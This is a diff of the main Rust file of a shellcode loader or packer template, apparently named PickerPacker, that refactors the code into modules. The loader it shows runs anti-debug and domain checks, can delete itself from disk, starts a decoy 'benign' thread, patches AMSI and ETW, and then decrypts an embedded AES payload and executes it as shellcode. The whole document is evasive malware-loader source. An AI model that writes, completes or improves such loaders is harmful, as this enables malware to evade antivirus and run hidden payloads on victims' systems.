@@ -1,7 +1,14 @@
+// ============================================================================
+// Main Template - Loader Entry Point
+// ============================================================================
+
 use std::ffi::c_void;
+
+// Core modules
 mod execution;
 mod benign;
 
+// Conditional modules
 #[cfg(feature = "UtilitySelfDeletion")]
 mod utilities;
 
@@ -11,92 +18,18 @@ mod checks;
 #[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple"))]
 mod evasion;
 
-#[cfg(any(feature = "TinyAES", feature = "CTAES"))]
-use std::env;
-
+// AES encryption support
 #[cfg(any(feature = "TinyAES", feature = "CTAES"))]
 mod aes;
 
-const ENCPAYLOAD: &[u8] = &[];  // will be replaced with the (encrypted) payload data
+#[cfg(any(feature = "TinyAES", feature = "CTAES"))]
+mod crypto;
 
 #[cfg(any(feature = "TinyAES", feature = "CTAES"))]
-fn hex_to_bytes(hex_str: &str) -> Result<Vec<u8>, String> {
-    if !hex_str.len().is_multiple_of(2) {
-        return Err("Hex string must have even length".to_string());
-    }
-    
-    let mut bytes = Vec::new();
-    for i in (0..hex_str.len()).step_by(2) {
-        let byte_str = &hex_str[i..i+2];
-        match u8::from_str_radix(byte_str, 16) {
-            Ok(byte) => bytes.push(byte),
-            Err(_) => return Err(format!("Invalid hex characters: {}", byte_str)),
-        }
-    }
-    Ok(bytes)
-}
+mod args;
 
-/// Returns (key_bytes, iv_bytes) if valid, otherwise exits with error
-#[cfg(any(feature = "TinyAES", feature = "CTAES"))]
-fn parse_and_validate_aes_args() -> (Vec<u8>, Vec<u8>) {
-    let args: Vec<String> = env::args().collect();
-    let mut aes_key_str = String::new();
-    let mut aes_iv_str = String::new();
-    
-    // Parse command-line arguments
-    for i in 0..args.len() {
-        match args[i].as_str() {
-            "--key" if i < args.len() - 1 => aes_key_str = args[i + 1].clone(),
-            "--iv" if i < args.len() - 1 => aes_iv_str = args[i + 1].clone(),
-            _ => {}
-        }
-    }
-    
-    // Check if key and IV are provided
-    if aes_key_str.is_empty() || aes_iv_str.is_empty() {
-        eprintln!("[-] Error: AES decryption requires both --key and --iv arguments");
-        eprintln!("    Usage: PickerPacker.exe --key <64_hex_chars> --iv <32_hex_chars>");
-        std::process::exit(1);
-    }
-    
-    // Validate and convert key
-    let aes_key = match hex_to_bytes(&aes_key_str) {
-        Ok(bytes) if bytes.len() == 32 => bytes,
-        Ok(_) => {
-            std::process::exit(1);
-        }
-        Err(e) => {
-            std::process::exit(1);
-        }
-    };
-    
-    // Validate and convert IV
-    let aes_iv = match hex_to_bytes(&aes_iv_str) {
-        Ok(bytes) if bytes.len() == 16 => bytes,
-        Ok(_) => {
-            std::process::exit(1);
-        }
-        Err(e) => {
-            std::process::exit(1);
-        }
-    };
-    
-    (aes_key, aes_iv)
-}
-
-/// Decrypt payload using the appropriate AES method
-#[cfg(any(feature = "TinyAES", feature = "CTAES"))]
-fn decrypt_payload(encrypted: &[u8], key: &[u8], iv: &[u8]) -> Option<Vec<u8>> {
-    #[cfg(feature = "TinyAES")]
-    {
-        return aes::aes_decrypt(encrypted, key, iv);
-    }
-    
-    #[cfg(feature = "CTAES")]
-    {
-        return aes::ctaes_decrypt(encrypted, key, iv);
-    }
-}
+// Payload data (will be replaced by packer)
+const ENCPAYLOAD: &[u8] = &[];
 
 /// Run all enabled evasion techniques
 #[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple"))]
@@ -113,7 +46,6 @@ fn run_evasion_techniques() {
 }
 
 fn main() {
-
     // Anti-debug checks - runs all enabled checks
     #[cfg(any(feature = "CheckAntiDebugProcessDebugFlags", feature = "CheckAntiDebugSystemDebugControl", feature = "CheckAntiDebugRemoteDebugger", feature = "CheckAntiDebugNtGlobalFlag", feature = "CheckDomainJoined"))]
     {
@@ -122,31 +54,32 @@ fn main() {
         }
     }
 
+    // Self-deletion utility
     #[cfg(feature = "UtilitySelfDeletion")]
     {
         let _ = utilities::utils::delete_self_from_disk();
     }
 
     // =======================================================================
-    // Benign Stuff
-    // Don't add more stuff here, put it in benign.rs
+    // Benign code execution (runs in separate thread)
     // =======================================================================
-
     benign::start_benign_thread();
 
     // =======================================================================
-    // Benign Stuff ends
+    // Evasion techniques (AMSI/ETW patching)
     // =======================================================================
-
-    // Run all evasion techniques before payload execution
     #[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple"))]
     run_evasion_techniques();
 
-    // Validate AES arguments FIRST if AES encryption is enabled
+    // =======================================================================
+    // AES decryption setup
+    // =======================================================================
     #[cfg(any(feature = "TinyAES", feature = "CTAES"))]
-    let (aes_key, aes_iv) = parse_and_validate_aes_args();
+    let (aes_key, aes_iv) = args::parse_and_validate_aes_args();
         
-    // Execute shellcode or payload without AES decryption
+    // =======================================================================
+    // Execute shellcode without AES decryption
+    // =======================================================================
     #[cfg(not(any(feature = "TinyAES", feature = "CTAES")))]
     {
         let shellcode = ENCPAYLOAD.to_vec();
@@ -257,11 +190,13 @@ fn main() {
         execution::shellcode_execute_flsalloc(shellcode.clone());
     }
 
+    // =======================================================================
     // Execute shellcode with AES decryption
+    // =======================================================================
     #[cfg(any(feature = "TinyAES", feature = "CTAES"))]
     {
         let encrypted_shellcode = ENCPAYLOAD;
-        if let Some(decrypted_shellcode) = decrypt_payload(encrypted_shellcode, &aes_key, &aes_iv) {
+        if let Some(decrypted_shellcode) = crypto::decrypt_payload(encrypted_shellcode, &aes_key, &aes_iv) {
             #[cfg(feature = "ShellcodeExecuteDefault")]
             execution::shellcode_execute_default(decrypted_shellcode.clone());
 
